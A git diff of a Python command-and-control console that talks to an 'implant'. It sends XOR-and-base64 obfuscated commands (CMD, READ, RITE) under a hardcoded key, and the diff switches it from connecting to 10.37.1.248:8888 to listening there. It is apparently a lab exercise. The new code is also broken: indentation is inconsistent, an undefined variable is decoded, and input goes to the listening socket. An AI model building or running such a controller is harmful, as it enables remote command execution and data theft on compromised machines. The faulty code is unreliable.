@@ -1,10 +1,14 @@
 # https://www.geeksforgeeks.org/python/socket-programming-python/
 import socket             
-import random          
+import random      
+import threading    
 # import pwn  
 import base64 
 
-s = socket.socket()     
+host = '10.37.1.248'
+port = 8888
+
+key = b"ED IS COOL"
     
 def fixed_xor(arg1: bytes, arg2: bytes) -> bytes:
     assert len(arg1) == len(arg2), "Trying to xor mismatched lengths!"
@@ -30,13 +34,9 @@ def enc(plaintext):
 def dec(ciphertext):
   return xor(base64.decodebytes(ciphertext), key)
 
-port = 8888
-key = b"ED IS COOL"
-s.connect(('10.37.1.248', port)) 
-
 types = ['HELO', 'EXIT', 'READ', 'RITE', 'CMD', 'ERR']
 
-def parse(s: socket.socket, user_input):
+def parseAndSendInput(s: socket.socket, user_input):
     user_input = user_input.split(' ')
     type = user_input[0]
     id = str(random.randint(0, 10 ** 9))
@@ -47,23 +47,35 @@ def parse(s: socket.socket, user_input):
     else:
         assert(data == '')
     s.send(enc(("  ".join([type, id, data])).encode()))
-while True:
-    # Send a command
-    parse(s, input('> '))
 
-    # Receive the response; handle clean disconnects gracefully.
-    ciphertext = s.recv(4096)
-    if not ciphertext:
-        print("[!] Connection closed by implant")
-        break
+def receiveMessage(c):
+   while True:
+       data = c.recv(1024)
+       if not data:
+           print("Disconnected")
+           break
 
-    try:
-        response = dec(ciphertext).decode().replace('\\n', '\n')
-    except Exception as e:
-        print(f"[!] Error decoding response: {e}")
-        break
+        try:
+            response = dec(ciphertext).decode().replace('\\n', '\n')
+        except Exception as e:
+            print(f"[!] Error decoding response: {e}")
+            break
 
-    print(response)
+       print(f"Received message: {response}")
 
+# Set up a socket and listen for a connection
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+   s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+   s.bind((host, port))
+   s.listen()
+   print(f"Listening on {host}:{port}")
+   c, a = s.accept()
+
+   # On connecting, use threading to both send and receive messages appropriately
+   threading.Thread(target=receiveMessage, args=(c,), daemon=True).start()
+   with c:
+       print(f"Connected to {a}")
+       while True:
+           parseAndSendInput(s, input('> '))
 
 s.close()
